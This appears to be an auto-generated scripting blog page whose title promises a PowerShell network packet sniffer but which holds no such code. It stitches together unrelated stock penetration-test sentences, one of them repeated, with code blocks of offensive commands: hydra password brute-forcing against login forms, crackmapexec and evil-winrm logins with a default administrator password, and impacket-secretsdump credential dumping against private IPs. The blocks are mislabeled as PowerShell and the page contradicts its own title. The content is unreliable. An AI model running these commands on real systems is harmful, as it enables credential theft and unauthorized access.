---
TitleSEO: "Network Packet Sniffer in PowerShell | ZureFX"
TitlePost: "Network Packet Sniffer — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for network packet sniffer. Built for security research and automation."
Keywords: "rust, script, scanner, fuzzer, powershell"
URL: "https://zurefx.github.io/scripting/script-network-packet-sniffer-504.html"
URL_IMAGES: ""
Date: "2024-02-07"
Tags: "Rust, Script, Scanner, Fuzzer, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-network-packet-sniffer-504"
Permalink: "/scripting/script-network-packet-sniffer-504.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Command injection was possible through unsanitized user input in the search functionality. Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `john`
- `ldapsearch`
- `secretsdump`

## Implementation

### Core Logic

The web application was vulnerable to Server-Side Template Injection (SSTI). The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
crackmapexec smb 10.121.28.86 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.58.182.64 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.123.10.92 -u administrator -p 'P@ssw0rd!' --shares
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The scheduled task ran with elevated privileges and could be abused for escalation.

### Helper Functions

The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.90.19.189
evil-winrm -i 10.73.19.119 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.24.114.99 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.96.165.189
```

### Advanced Options

Lateral movement was facilitated by reusing discovered credentials across services. The application stored sensitive credentials in an unencrypted configuration file. The backup files contained sensitive information that should not have been accessible.

```bash
crackmapexec smb 10.43.233.41 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.83.234.20 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.94.128.227 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p443,443,5986 10.74.147.236 -oN scan.txt
```

## Output

### Example Output

Privilege escalation was possible due to misconfigured sudo permissions. The target system was identified as running a vulnerable version of the service.

```
[+] Scanning target...
[+] Found 8 results
[+] Done in 3.41s
```
